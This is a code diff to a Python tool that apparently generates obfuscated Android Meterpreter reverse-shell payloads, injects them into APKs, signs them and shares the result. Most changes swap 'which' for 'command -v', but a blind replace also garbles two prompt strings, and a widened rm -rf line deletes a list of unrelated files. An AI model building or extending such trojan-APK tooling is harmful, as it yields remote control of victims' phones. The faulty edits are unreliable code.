@@ -130,7 +130,7 @@ def check():
     print(f"{con+Y}\n\n{Y}")
     head("Checking for Dependencies \n")
     print(f"{YELLOW}\n[*] Checking : APKTool")
-    apktool = os.system("which apktool > /dev/null")
+    apktool = os.system("command -v apktool > /dev/null")
     if apktool == 0:
         print(f"{GREEN}[+] APKTool - OK")
     else:
@@ -148,7 +148,7 @@ def check():
             return check()
                     
     print(f"{YELLOW}\n[*] Checking : Jarsigner")
-    jarsigner = os.system("which jarsigner > /dev/null")
+    jarsigner = os.system("command -v jarsigner > /dev/null")
     if jarsigner == 0:
         print(f"{GREEN}[+] Jarsigner - OK")
     else:
@@ -161,7 +161,7 @@ def check():
 
 
     print(f"{YELLOW}\n[*] Checking : APKsigner")
-    apksigner = os.system("which apksigner > /dev/null")
+    apksigner = os.system("command -v apksigner > /dev/null")
     if apksigner == 0:
         print(f"{GREEN}[+] APKsigner - OK")
     else:
@@ -173,7 +173,7 @@ def check():
             return check()
        
     print(f"{YELLOW}\n[*] Checking : ZipAlign")
-    zipalign = os.system("which zipalign > /dev/null")
+    zipalign = os.system("command -v zipalign > /dev/null")
     if zipalign == 0:
         print(f"{GREEN}[+] ZipAlign - OK")
     else:
@@ -184,7 +184,7 @@ def check():
             os.system("apt-get install aapt -y ")
             return check()
     print(f"{YELLOW}\n[*] Checking : Metasploit")
-    zipalign = os.system("which msfvenom > /dev/null")
+    zipalign = os.system("command -v msfvenom > /dev/null")
     if zipalign == 0:
         print(f"{GREEN}[+] Metasploit - OK")
     else:
@@ -206,7 +206,7 @@ def pay_type():
     (1) android/meterpreter/reverse_tcp
     (2) android/meterpreter/reverse_http    
     (3) android/meterpreter/reverse_https\n""")
-    payload_type = str((input(f"{BLUE+Style.BRIGHT}[{W}?{B}] Which Type of Payload, You Want to Create (1/2/3): ")))
+    payload_type = str((input(f"{BLUE+Style.BRIGHT}[{W}?{B}] command -v Type of Payload, You Want to Create (1/2/3): ")))
     if payload_type == '1':
         type_of_payload = "android/meterpreter/reverse_tcp" 
     elif payload_type == '2':
@@ -283,7 +283,7 @@ def pay_type():
         print()
         res()
     print()
-    head(f"{YELLOW}Generating Random Variables which will be used in Ofustication")
+    head(f"{YELLOW}Generating Random Variables command -v will be used in Ofustication")
     VAR1 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True) # smali dir renaming
     VAR1 = str(VAR1.strip()).split('\'')[1]
     VAR2 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True) # smali dir renaming
@@ -503,7 +503,7 @@ def pay_type():
     if zipalign_apk == 0:
         print(f"{GREEN}[+] ZipAligned APK Successfully!")
     os.system(f"mv {pwd}/signed.apk {pathoapk}")
-    os.system(f"rm -rf {pwd}/normal_apk {pwd}/android_payload.apk {pwd}/injected.apk")
+    os.system(f"rm -rf {pwd}/normal_apk {pwd}/android_payload.apk {pwd}/injected.apk dragon      injected.apk.idsig  ramp    twelv.txt 2        appnm      flaps       ins.sh              result handler.rc  out                 test1 > /dev/null 2&>1")
     print(f"{GREEN}[+] Output : {WHITE} {pathoapk}")
     os.system(f'termux-open {pathoapk} --send > /dev/null 2&>1')
     print("")
